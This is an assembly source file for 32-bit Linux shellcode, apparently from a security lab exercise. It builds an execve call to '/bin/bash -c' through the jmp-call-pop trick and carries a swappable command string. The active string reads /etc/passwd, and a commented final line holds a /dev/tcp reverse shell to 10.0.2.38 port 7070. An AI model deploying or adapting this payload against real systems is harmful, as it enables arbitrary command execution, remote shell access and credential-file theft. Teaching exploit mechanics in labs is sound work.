ARGV equ 72

section .text
  global _start
    _start:
	BITS 32
	jmp short two
    one:
 	pop ebx             ; Get the address of the data

        ; Add zero to each of string
 	xor eax, eax
 	mov [ebx+9],  al     ; terminate the /bin/bash string
 	mov [ebx+12], al     ; terminate the -c string
 	mov [ebx+ARGV-1], al ; terminate the command string

        ; Construct the argument arrays
 	mov [ebx+ARGV], ebx     ; argv[0]  = "/bin/bash"
        lea ecx, [ebx+10]   
 	mov [ebx+ARGV+4],  ecx  ; argv[1]  = "-c"
        lea ecx, [ebx+13]   
 	mov [ebx+ARGV+8],  ecx  ; argv[2]  = the command string
 	mov [ebx+ARGV+12], eax  ; argv[3]  = 0

                              ; ebx = the /bin/bash command 
 	lea ecx, [ebx+ARGV]   ; ecx = argv[]
        xor edx, edx          ; edx = 0
 	xor eax, eax
        mov al,  0x0b   
        int 0x80
     two:
        call one                                                                   
        db '/bin/bash*'
        db '-c*'
        db '/bin/ls -l; echo Hello 32; /bin/tail -n 2 /etc/passwd     *'
        ; The * at the end of this line is a position marker          *
        ; We can put any command or commands in the string. Don't move the
        ; position of the *, or we have to change the value for ARGV on the 1st line.
        db 'AAAA'   ; Place holder for argv[0] --> "/bin/bash"
        db 'BBBB'   ; Place holder for argv[1] --> "-c"
        db 'CCCC'   ; Place holder for argv[2] --> the command string
        db 'DDDD'   ; Place holder for argv[3] --> NULL

       ;db '/bin/bash -i >/dev/tcp/10.0.2.38/7070 0<&1 2>&1           *

